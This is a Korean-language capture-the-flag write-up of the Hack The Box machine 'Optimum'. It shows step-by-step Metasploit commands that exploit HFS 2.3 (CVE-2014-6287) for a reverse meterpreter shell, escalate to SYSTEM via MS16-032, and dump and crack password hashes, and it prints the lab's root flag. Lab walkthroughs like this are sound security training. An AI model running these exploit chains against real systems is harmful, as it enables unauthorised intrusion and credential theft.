# HTB - Optimum

## 머신 정보

|항목|내용|
|---|---|
|이름|Optimum|
|난이도|Easy|
|OS|Windows Server 2012 R2|
|IP|10.129.190.228|
|취약점|CVE-2014-6287 (HFS RCE) + MS16-032 (Privesc)|
|태그|`HFS` `RCE` `CVE-2014-6287` `MS16-032` `Windows`|

---

## 공격 흐름 요약

```
nmap 포트 스캔
→ 80 포트 (HttpFileServer 2.3)
→ CVE-2014-6287 RCE 취약점
→ Metasploit rejetto_hfs_exec
→ kostas 유저 쉘 획득
→ local_exploit_suggester 실행
→ MS16-032 Privesc
→ NT AUTHORITY\SYSTEM
→ Root Flag 획득
```

---

## 1. 정찰 (Reconnaissance)

### 1.1 Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.190.228
```

**결과:**

|PORT|STATE|SERVICE|
|---|---|---|
|80/tcp|open|http|

> 포트 80 하나만 열려있음

### 1.2 서비스 버전 확인

```bash
nmap -sV -p 80 10.129.190.228
```

또는 브라우저에서:

```
http://10.129.190.228/
```

→ **HttpFileServer (HFS) 2.3** 확인

---

## 2. 취약점 분석

### CVE-2014-6287 - HFS Remote Code Execution

|항목|내용|
|---|---|
|CVE|**CVE-2014-6287**|
|대상|HttpFileServer 2.3x|
|취약 함수|`findMacroMarker()`|
|취약점 유형|원격 코드 실행 (RCE)|
|인증 필요|❌ (Unauthenticated)|
|CVSS|10.0 CRITICAL|
|Metasploit 모듈|`exploit/windows/http/rejetto_hfs_exec`|

URL 파라미터의 `%00` 등 특수문자를 통해 OS 명령어 실행 가능.

---

## 3. 초기 접근 (Initial Access)

### Metasploit - rejetto_hfs_exec

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.129.190.228
set LHOST tun0
run
```

**결과:**

```
meterpreter > getuid
Server username: OPTIMUM\kostas
```

---

## 4. User Flag

```bash
meterpreter > shell
type C:\Users\kostas\Desktop\user.txt
```

---

## 5. 권한 상승 (Privilege Escalation)

### 5.1 시스템 정보 확인

```
OS: Windows Server 2012 R2 (Version 6.3.9600)
```

### 5.2 local_exploit_suggester 실행

```bash
meterpreter > background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

**Yes 결과 목록:**

|#|모듈|결과|
|---|---|---|
|1|bypassuac_comhijack|Yes|
|2|bypassuac_eventvwr|Yes|
|3|bypassuac_sluihijack|Yes|
|4|cve_2020_0787_bits_arbitrary_file_move|Yes|
|**5**|**ms16_032_secondary_logon_handle_privesc**|**Yes**|
|6|tokenmagic|Yes|

### 5.3 MS16-032 익스플로잇

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST tun0
run
```

**결과:**

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 6. Root Flag

```bash
meterpreter > shell
type C:\Users\Administrator\Desktop\root.txt
```

```
43bb7c862d24a3e2d4f86380a3f84a8f
```

---

## 7. Optional - kostas 패스워드

```bash
meterpreter > hashdump
# 해시 → crackstation.net
```

패스워드: **kdeEjDowkS***

---

## 8. 정리 및 교훈

### 취약점 체인

```
HFS 2.3 노출 (80 포트)
→ CVE-2014-6287 인증 없이 RCE
→ kostas 유저 쉘 획득
→ MS16-032 로컬 권한 상승
→ SYSTEM 획득
```

### 핵심 교훈

- **레거시 소프트웨어** (HFS 2.3) 사용 금지
- **파일 서버를 인터넷에 직접 노출** 하면 안됨
- **패치 관리** 소홀 → MS16-032로 즉시 SYSTEM
- local_exploit_suggester로 **빠르게 Privesc 경로 탐색** 가능

---

## 참고

| 항목                 | 링크                                                                                |
| ------------------ | --------------------------------------------------------------------------------- |
| CVE-2014-6287      | https://nvd.nist.gov/vuln/detail/CVE-2014-6287                                    |
| Exploit-DB         | https://www.exploit-db.com/exploits/34926                                         |
| MS16-032           | https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032 |
| Metasploit HFS     | `exploit/windows/http/rejetto_hfs_exec`                                           |
| Metasploit Privesc | `exploit/windows/local/ms16_032_secondary_logon_handle_privesc`                   |